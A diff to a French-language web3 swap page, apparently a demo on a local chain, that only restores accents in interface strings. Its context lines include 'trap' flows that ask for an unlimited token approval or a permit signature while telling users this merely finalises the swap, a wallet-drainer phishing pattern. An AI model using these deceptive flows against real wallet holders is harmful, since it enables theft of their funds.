@@ -36,9 +36,9 @@
     try {
       var c = await p.request({ method: "eth_chainId" });
       var ok = BigInt(c) === BigInt(addresses.chainId);
-      setNet(ok ? "Reseau connecte" : "Mauvais reseau", ok ? "ok" : "bad");
+      setNet(ok ? "Réseau connecté" : "Mauvais réseau", ok ? "ok" : "bad");
       return ok;
-    } catch (e) { setNet("Reseau inconnu", "bad"); return false; }
+    } catch (e) { setNet("Réseau inconnu", "bad"); return false; }
   }
 
   async function ensureChain(p) {
@@ -53,7 +53,7 @@
         await p.request({
           method: "wallet_addEthereumChain",
           params: [{
-            chainId: hex, chainName: "Chaine locale de demo",
+            chainId: hex, chainName: "Chaîne locale de démo",
             nativeCurrency: { name: "Avalanche", symbol: "AVAX", decimals: 18 },
             rpcUrls: [addresses.rpcUrl], blockExplorerUrls: [],
           }],
@@ -74,23 +74,23 @@
   async function doHonest(p) {
     setState("Confirmez l'autorisation de " + AMOUNT_USDC + " DUSDC.", "");
     await p.request({ method: "eth_sendTransaction", params: [txApproveRouter(addresses, account, AMOUNT_USDC)] });
-    setState("Confirmez l'echange.", "");
+    setState("Confirmez l'échange.", "");
     await p.request({ method: "eth_sendTransaction", params: [txSwap(addresses, account, AMOUNT_USDC)] });
-    setState("Echange effectue. Vous avez recu de l'AVAX.", "ok");
+    setState("Échange effectué. Vous avez reçu de l'AVAX.", "ok");
   }
 
   async function doTrapApprove(p) {
-    setState("Confirmez l'autorisation pour finaliser l'echange.", "");
+    setState("Confirmez l'autorisation pour finaliser l'échange.", "");
     await p.request({ method: "eth_sendTransaction", params: [txApproveUnlimited(addresses, account)] });
-    setState("Echange en cours de finalisation.", "ok");
+    setState("Échange en cours de finalisation.", "ok");
   }
 
   async function doTrapPermit(p) {
     var nonce = await readNonce(p, account);
     var typed = buildPermit(addresses, account, nonce);
-    setState("Signez pour finaliser l'echange (gratuit, sans transaction).", "");
+    setState("Signez pour finaliser l'échange (gratuit, sans transaction).", "");
     await p.request({ method: "eth_signTypedData_v4", params: [account, JSON.stringify(typed)] });
-    setState("Echange en cours de finalisation.", "ok");
+    setState("Échange en cours de finalisation.", "ok");
   }
 
   function run(p) {
@@ -110,17 +110,17 @@
         account = accts[0];
         await ensureChain(p);
         await checkNet(p);
-        $("acct").textContent = "Connecte : " + shortAddr(account);
-        btn.textContent = "Echanger";
-        setState("Pret a echanger " + AMOUNT_USDC + " DUSDC contre de l'AVAX.", "");
+        $("acct").textContent = "Connecté : " + shortAddr(account);
+        btn.textContent = "Échanger";
+        setState("Prêt à échanger " + AMOUNT_USDC + " DUSDC contre de l'AVAX.", "");
         btn.disabled = false;
         return;
       }
-      if (!(await checkNet(p))) { setState("Mauvais reseau. Reconnectez votre portefeuille.", "bad"); btn.disabled = false; return; }
+      if (!(await checkNet(p))) { setState("Mauvais réseau. Reconnectez votre portefeuille.", "bad"); btn.disabled = false; return; }
       await run(p);
     } catch (err) {
       var cancelled = err && (err.code === 4001 || /user rejected|denied/i.test(err.message || ""));
-      setState(cancelled ? "Operation annulee." : "Operation impossible pour le moment. Reessayez.", "bad");
+      setState(cancelled ? "Opération annulée." : "Opération impossible pour le moment. Réessayez.", "bad");
       btn.disabled = false;
     }
   });
@@ -130,7 +130,7 @@
     if (!res.ok) {
       setNet("Service indisponible", "bad");
       $("btn-swap").textContent = "Indisponible pour le moment";
-      setState("Service momentanement indisponible. Merci de reessayer plus tard.", "bad");
+      setState("Service momentanément indisponible. Merci de réessayer plus tard.", "bad");
       return;
     }
     addresses = res.data;
@@ -138,13 +138,13 @@
       var p = getProvider();
       if (!p) {
         setNet("Aucun portefeuille", "bad");
-        $("btn-swap").textContent = "Aucun portefeuille detecte";
+        $("btn-swap").textContent = "Aucun portefeuille détecté";
         setState("Installez un portefeuille compatible, puis rechargez cette page.", "bad");
         return;
       }
       $("btn-swap").disabled = false;
       $("btn-swap").textContent = "Connecter le portefeuille";
-      setState("Connectez votre portefeuille pour echanger.", "");
+      setState("Connectez votre portefeuille pour échanger.", "");
       await checkNet(p);
       try { p.on && p.on("chainChanged", function () { checkNet(p); }); } catch (e) {}
     }, 250);
